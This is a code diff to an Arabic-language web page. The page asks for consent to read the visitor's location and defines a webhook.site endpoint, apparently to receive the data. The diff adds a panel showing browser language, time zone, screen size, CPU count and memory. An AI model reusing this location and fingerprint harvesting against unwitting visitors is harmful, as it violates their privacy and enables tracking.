@@ -19,8 +19,25 @@
 <p id="result">بانتظار موافقتك...</p>
 <p id="status"></p>
 
+<hr>
+
+<h3>معلومات المتصفح والجهاز</h3>
+<pre id="device"></pre>
+
 <script>
 const webhook = "https://webhook.site/5d7ed63c-8d26-46ea-b7bc-7d8c3af1230f";
+
+// عرض معلومات المتصفح والجهاز
+document.getElementById("device").textContent =
+"اللغة: " + navigator.language +
+"\nالمنطقة الزمنية: " +
+Intl.DateTimeFormat().resolvedOptions().timeZone +
+"\nحجم الشاشة: " +
+screen.width + " × " + screen.height +
+"\nعدد المعالجات المنطقية: " +
+(navigator.hardwareConcurrency || "غير متاح") +
+"\nالذاكرة التقريبية: " +
+(navigator.deviceMemory || "غير متاحة") + " GB";
 
 function getLocation() {
   document.getElementById("status").textContent =
